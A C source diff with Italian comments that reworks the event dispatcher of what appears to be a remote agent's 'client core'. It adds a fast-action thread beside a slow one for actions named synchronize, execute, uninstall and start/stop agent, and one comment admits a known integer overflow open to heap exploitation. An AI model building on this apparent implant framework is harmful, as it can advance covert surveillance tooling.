@@ -27,7 +27,7 @@ typedef void (WINAPI *EventMonitorStart_t) (void);
 typedef void (WINAPI *EventMonitorStop_t) (void);
 typedef BOOL (WINAPI *ActionFunc_t) (BYTE *, DWORD);
 
-ActionFunc_t ActionFuncGet(DWORD action_type);
+ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action);
 
 
 // Gestione event monitor  ----------------------------------------------
@@ -200,6 +200,7 @@ typedef struct {
 typedef struct {
 	DWORD subaction_count; // numero di azioni collegate all'evento 
 	action_elem *subaction_list; // puntatore all'array delle azioni 
+	BOOL is_fast_action; // e' TRUE se non contiene alcuna sottoazione lenta (sync, uninst e execute)
 	BOOL triggered; // Se l'evento e' triggerato o meno
 } event_action_elem;
 
@@ -224,12 +225,32 @@ void TriggerEvent(DWORD index, DWORD event_id)
 
 // Cerca un evento qualsiasi che e' stato triggerato. Se lo trova torna TRUE e valorizza
 // il puntatore all'array delle relative actions e il numero delle actions stesse.
-BOOL ReadEvent(DWORD *event_id)
+// Legge solo le azioni lente
+BOOL ReadEventSlow(DWORD *event_id)
 {
 	static DWORD i = 0;
 
 	for (; i<event_action_count; i++) 
-		if (event_action_array[i].triggered) {
+		if (event_action_array[i].triggered && !event_action_array[i].is_fast_action) {
+			event_action_array[i].triggered = FALSE;
+			*event_id = i;
+			// Evita che lo stesso evento possa 
+			// essere triggerato continuamente	
+			i++; 
+			return TRUE;
+		}
+
+	i = 0;
+	return FALSE;
+}
+
+// Legge solo azioni veloci
+BOOL ReadEventFast(DWORD *event_id)
+{
+	static DWORD i = 0;
+
+	for (; i<event_action_count; i++) 
+		if (event_action_array[i].triggered && event_action_array[i].is_fast_action) {
 			event_action_array[i].triggered = FALSE;
 			*event_id = i;
 			// Evita che lo stesso evento possa 
@@ -259,14 +280,16 @@ void DispatchEvent(DWORD event_id)
 
 
 // Aggiunge una sotto-azione per l'evento "event_number" 
-void ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *param, DWORD param_len)
+// Torna FALSE solo se ha inserito con successo una azione slow
+BOOL ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *param, DWORD param_len)
 {
 	void *temp_action_list;
+	BOOL is_fast_action;
 	DWORD subaction_count;
 
 	// Se l'evento non esiste nella event_action table ritorna
 	if (event_number >= event_action_count)
-		return;
+		return TRUE;
 
 	// All'inizio subaction_list e subaction_count sono a 0 perche' azzerate nella ActionTableInit
 	// XXX si, c'e' un int overflow se ci sono 2^32 sotto azioni che potrebbe portare a un exploit nello heap (es: double free)....
@@ -274,13 +297,13 @@ void ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *par
 
 	// Se non riesce ad aggiungere la nuova sottoazione lascia tutto com'e'
 	if (!temp_action_list)
-		return;
+		return TRUE;
 
 	// Se l'array delle sottoazioni e' stato ampliato con successo, incrementa il numero delle sottoazioni
 	// e aggiunge la nuova subaction
 	subaction_count = event_action_array[event_number].subaction_count++;
 	event_action_array[event_number].subaction_list = (action_elem *)temp_action_list;
-	event_action_array[event_number].subaction_list[subaction_count].pActionFunc = ActionFuncGet(subaction_type);
+	event_action_array[event_number].subaction_list[subaction_count].pActionFunc = ActionFuncGet(subaction_type, &is_fast_action);
 
 	if (param_len) 
 		event_action_array[event_number].subaction_list[subaction_count].param = (BYTE *)malloc(param_len);
@@ -295,6 +318,7 @@ void ActionTableAddSubAction(DWORD event_number, DWORD subaction_type, BYTE *par
 	} else
 		event_action_array[event_number].subaction_list[subaction_count].param_len = 0;
 
+	return is_fast_action;
 }
 
 
@@ -324,6 +348,8 @@ void ActionTableInit(DWORD number)
 		event_action_count = number;
 		event_action_array = temp_event_action_array;
 		ZERO(event_action_array, number * sizeof(event_action_elem));
+		for (i=0; i<event_action_count; i++) 
+			event_action_array[i].is_fast_action = TRUE; // all'inizio conta tutte come fast actions
 	} else {
 		event_action_count = 0;
 		SAFE_FREE(event_action_array);
@@ -342,6 +368,7 @@ void ActionTableInit(DWORD number)
 typedef struct {
 	DWORD action_type;
 	ActionFunc_t pActionFunc;
+	BOOL is_fast_action;
 } dispatch_func_elem;
 
 
@@ -351,26 +378,30 @@ dispatch_func_elem dispatch_func_array[MAX_DISPATCH_FUNCTION];
 
 
 // Registra un'action
-void ActionFuncRegister(DWORD action_type, ActionFunc_t pActionFunc)
+void ActionFuncRegister(DWORD action_type, ActionFunc_t pActionFunc, BOOL is_fast_action)
 {
 	if (dispatch_func_count >= MAX_DISPATCH_FUNCTION)
 		return;
 
 	dispatch_func_array[dispatch_func_count].action_type = action_type;
 	dispatch_func_array[dispatch_func_count].pActionFunc = pActionFunc;
+	dispatch_func_array[dispatch_func_count].is_fast_action = is_fast_action;
 
 	dispatch_func_count++;
 }
 
 
 // Ritorna il puntatore alla funzione di action associata ad un certo action_type
-ActionFunc_t ActionFuncGet(DWORD action_type)
+ActionFunc_t ActionFuncGet(DWORD action_type, BOOL *is_fast_action)
 {
 	DWORD i;
 
 	for (i=0; i<dispatch_func_count; i++)
-		if (dispatch_func_array[i].action_type == action_type)
+		if (dispatch_func_array[i].action_type == action_type) {
+			if (is_fast_action)
+				*is_fast_action = dispatch_func_array[i].is_fast_action;
 			return dispatch_func_array[i].pActionFunc;
+		}
 
 	return NULL;
 }
@@ -443,7 +474,10 @@ void UpdateEventConf()
 			for (;subaction_count>0; subaction_count--) {
 				READ_DWORD(tag, conf_ptr);
 				READ_DWORD(param_len, conf_ptr);
-				ActionTableAddSubAction(index, tag, conf_ptr, param_len);
+				// Se ha aggiunto una subaction "slow" marca tutta l'action come slow
+				// Basta una subaction slow per marcare tutto l'action
+				if (!ActionTableAddSubAction(index, tag, conf_ptr, param_len)) 
+					event_action_array[index].is_fast_action = FALSE;
 				conf_ptr += param_len;
 			}
 		}
@@ -511,11 +545,28 @@ void SM_AddExecutedProcess(DWORD pid)
 		}
 }
 
+// Loop di gestione delle azioni FAST
+DWORD WINAPI FastActionsThread(DWORD dummy)
+{
+	DWORD event_id;
+	LOOP {
+		CANCELLATION_POINT(bInstantActionThreadSemaphore);
+		if (ReadEventFast(&event_id)) 
+			DispatchEvent(event_id);
+		else
+			Sleep(SYNCM_SLEEPTIME);
+
+	}
+	return 0;
+}
 
 // Ciclo principale di monitoring degli eventi. E' praticamente il ciclo principale di tutto il client core.
 void SM_MonitorEvents(DWORD dummy)
 {
 	DWORD event_id;
+	DWORD dummy2;
+
+	InitializeCriticalSection(&action_critic_sec);
 
 	// Registrazione degli EM e delle AF. 
 	EventMonitorRegister(EM_TIMER, EM_TimerAdd, EM_TimerStart, EM_TimerStop);
@@ -525,19 +576,22 @@ void SM_MonitorEvents(DWORD dummy)
 	EventMonitorRegister(EM_WINEVEN, EM_MonEventAdd, EM_MonEventStart, EM_MonEventStop);	
 	EventMonitorRegister(EM_QUOTA, EM_QuotaAdd, EM_QuotaStart, EM_QuotaStop);	
 
-	ActionFuncRegister(AF_SYNCRONIZE, DA_Syncronize);
-	ActionFuncRegister(AF_STARTAGENT, DA_StartAgent);
-	ActionFuncRegister(AF_STOPAGENT, DA_StopAgent);
-	ActionFuncRegister(AF_EXECUTE, DA_Execute);
-	ActionFuncRegister(AF_UNINSTALL, DA_Uninstall);
-	ActionFuncRegister(AF_LOGINFO, DA_LogInfo);
-	ActionFuncRegister(AF_STARTEVENT, DA_StartEvent);
-	ActionFuncRegister(AF_STOPEVENT, DA_StopEvent);
+	ActionFuncRegister(AF_SYNCRONIZE, DA_Syncronize, FALSE);
+	ActionFuncRegister(AF_STARTAGENT, DA_StartAgent, TRUE);
+	ActionFuncRegister(AF_STOPAGENT, DA_StopAgent, TRUE);
+	ActionFuncRegister(AF_EXECUTE, DA_Execute, FALSE);
+	ActionFuncRegister(AF_UNINSTALL, DA_Uninstall, FALSE);
+	ActionFuncRegister(AF_LOGINFO, DA_LogInfo, TRUE);
+	ActionFuncRegister(AF_STARTEVENT, DA_StartEvent, TRUE);
+	ActionFuncRegister(AF_STOPEVENT, DA_StopEvent, TRUE);
 
 	// Legge gli eventi e le azioni dal file di configurazione. 
 	// Deve essere sempre posizionato DOPO la registrazione di EM e AF
 	UpdateEventConf();
 	EventMonitorStartAll();
+
+	// Lancia il thread che gestira' gli eventi FAST
+	hInstantActionThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FastActionsThread, NULL, 0, &dummy2);
 
 	// Ciclo principale di lettura degli eventi
 	LOOP {
@@ -545,7 +599,7 @@ void SM_MonitorEvents(DWORD dummy)
 		// (va eseguita per prima nel loop).
 		SM_HandleExecutedProcess();
 
-		if (ReadEvent(&event_id)) 
+		if (ReadEventSlow(&event_id)) 
 			DispatchEvent(event_id);
 		else
 			Sleep(SYNCM_SLEEPTIME);
